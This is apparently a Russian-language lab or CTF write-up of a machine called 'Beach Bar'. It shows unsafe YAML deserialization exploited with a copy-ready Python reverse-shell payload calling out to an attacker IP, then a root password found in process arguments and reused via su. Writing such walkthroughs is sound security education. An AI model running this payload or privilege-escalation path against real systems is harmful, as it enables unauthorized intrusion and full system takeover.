# Beach Bar — YAML-десериализация и повторное использование пароля

## Первичный доступ

В заметках к комнате была указана пара учётных данных `dj:dj`. После входа я получил доступ к приложению.

![Начальная страница Beach Bar](../images/Pasted%20image%2020260808231844.png)

## YAML-десериализация

Приложение принимало YAML и обрабатывало его небезопасным способом. Я проверил возможность выполнения Python-кода через `!!python/object/apply:os.system`.

Payload для reverse shell:

```yaml
playlist:
  name: !!python/object/apply:os.system
    - |
      export RHOST="192.168.145.136"; export RPORT=5555; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![Payload YAML для выполнения команды](../images/Pasted%20image%2020260808233937.png)

После отправки payload получил соединение на Kali.

![Полученный reverse shell](../images/Pasted%20image%2020260808234101.png)

Стабилизировал оболочку и начал проверку окружения.

![Стабилизированный shell](../images/Pasted%20image%2020260810190548.png)

## Поиск root-вектора

В переменных окружения обнаружил упоминание `beachbar.service`. Это подсказало, что shell выполняется в контексте systemd-сервиса.

Проверил unit-файл:

```bash
cat /etc/systemd/system/beachbar.service
```

![Содержимое beachbar.service](../images/Pasted%20image%2020260810191909.png)

В `WorkingDirectory` был указан проект `/opt/beach-bar/webapp`, а зависимость `jukeboxd.service` подсказала направление дальнейшего поиска.

В исходном коде `jukeboxd.py` обнаружил обязательный параметр `--stream-pass`.

![Параметр --stream-pass в исходном коде](../images/Pasted%20image%2020260810191950.png)

Проверил запущенные процессы:

```bash
ps auxww | grep jukeboxd
```

Флаг `ww` был важен: без него длинная командная строка могла обрезаться. В аргументах процесса оказался пароль:

```text
SunsetSpritz2024!
```

![Пароль в аргументах процесса jukeboxd](../images/Pasted%20image%2020260810192131.png)

Проверил повторное использование пароля:

```bash
su root
```

Пароль подошёл, и я получил root-доступ.

![Успешный переход к root](../images/Pasted%20image%2020260810192219.png)

## Итог

1. Получил доступ с учётными данными `dj:dj`.
2. Эксплуатировал небезопасную YAML-десериализацию.
3. Получил reverse shell.
4. Нашёл пароль в аргументах процесса `jukeboxd`.
5. Использовал повторное использование пароля для входа в root.

Основные проблемы: небезопасная десериализация YAML, передача секрета в аргументах процесса и повторное использование пароля.
